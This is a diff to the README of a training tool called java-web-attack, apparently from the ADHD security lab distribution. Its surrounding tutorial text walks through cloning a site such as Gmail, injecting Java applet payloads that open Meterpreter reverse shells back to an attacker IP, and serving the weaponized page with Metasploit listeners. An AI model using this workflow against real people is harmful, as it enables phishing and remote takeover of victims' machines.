@@ -19,11 +19,13 @@ Install Location
 Usage
 -----
 
-`~$` **`cd /opt/java-web-attack`**
+NOTE: You will want to run all of the commands in this tutorial as root.  To become root run the command `sudo su -`.
 
-`/opt/java-web-attack$` **`./clone.sh <url to clone>`**
+`~#` **`cd /opt/java-web-attack`**
+
+`/opt/java-web-attack#` **`./clone.sh <url to clone>`**
   
-`/opt/java-web-attack$` **`./weaponize.py -h`**
+`/opt/java-web-attack#` **`./weaponize.py -h`**
 
         Usage:
           ./weaponize.py [-w <payload>] [-l <payload>] [-m <payload>] <html_file> <ip>
@@ -40,7 +42,7 @@ Usage
         
         Note: The default ports used for the Windows, Linux, and Mac listeners are 3000, 3001, and 3002 respectively.
 
-`/opt/java-web-attack$` **`./serve.sh`**
+`/opt/java-web-attack#` **`./serve.sh`**
 
 Video Walkthrough
 -----------------
@@ -62,7 +64,7 @@ Where `$chromeUA` is Google Chrome's User Agent string and `$1` is the URL to cl
 
 To run the script simply pass in the URL you wish to clone. For example, to clone Gmail run:
 
-`/opt/java-web-attack$` **`./clone.sh https://gmail.com`**
+`/opt/java-web-attack#` **`./clone.sh https://gmail.com`**
 
         <<<snip>>>
         Saving to: ‘index.html’
@@ -81,7 +83,7 @@ You need an HTML page and your IP address so that the payloads know where to con
 
 The basic usage of the `weaponize.py` script is to pass in the HTML file to modify and then the IP address of your ADHD machine.
 
-`/opt/java-web-attack$` **`./weaponize.py index.html 172.16.215.138`**
+`/opt/java-web-attack#` **`./weaponize.py index.html 172.16.215.138`**
 
         Generating Windows payload: windows/meterpreter/reverse_tcp...
         Generating Linux payload: linux/x86/meterpreter/reverse_tcp...
@@ -110,7 +112,7 @@ Setting up the server to deliver the weaponized page, payloads, and handlers req
 
 Note: Since this shuts down Apache during the attack, you will be unable to access these intructions through the normal method. Please leave this page open without refreshing until you have completed the exercise and restarted Apache.
 
-`/opt/java-web-attack$` **`./serve.sh`**
+`/opt/java-web-attack#` **`./serve.sh`**
 
         Shutting down Apache...
          * Stopping web server apache2 *
@@ -146,7 +148,7 @@ To stop the Metasploit listeners and shut down the Python web server, type `exit
 
 Finally, you will need to restart Apache.
 
-`/opt/java-web-attack$` **`sudo service apache2 start`**
+`/opt/java-web-attack#` **`sudo service apache2 start`**
 
 Note: If this does not work, rebooting your machine will.
 
@@ -157,17 +159,17 @@ There are a few ways to customize the payloads used by `weaponize.py`.
 
 The first is through command line arguments to the script itself. For instance, to customize the Windows and Linux payloads (but leave the OSX payload as default) run:
 
-`/opt/java-web-attack$` **`./weaponize.py -w windows/x64/meterpreter/reverse_https -l linux/x64/meterpreter/reverse_tcp index.html 172.16.215.138`**
+`/opt/java-web-attack#` **`./weaponize.py -w windows/x64/meterpreter/reverse_https -l linux/x64/meterpreter/reverse_tcp index.html 172.16.215.138`**
 
 In this instance, we specified **windows/x64/meterpreter/reverse_https** in order to use the 64-bit Meterpreter communicating over HTTPS for the Windows payload and **linux/x64/meterpreter/reverse_tcp** to use the 64-bit variant of the default Linux payload.
 
 For a full listing of available payloads you can run the following:
 
-`/opt/java-web-attack$` **`msfvenom -l payloads`**
+`/opt/java-web-attack#` **`msfvenom -l payloads`**
 
 As there are many payloads available, you may wish to filter them using `grep` to only show one operating system at a time.
 
-`/opt/java-web-attack$` **`msfvenom -l payloads | grep windows`**
+`/opt/java-web-attack#` **`msfvenom -l payloads | grep windows`**
 
 ---
 
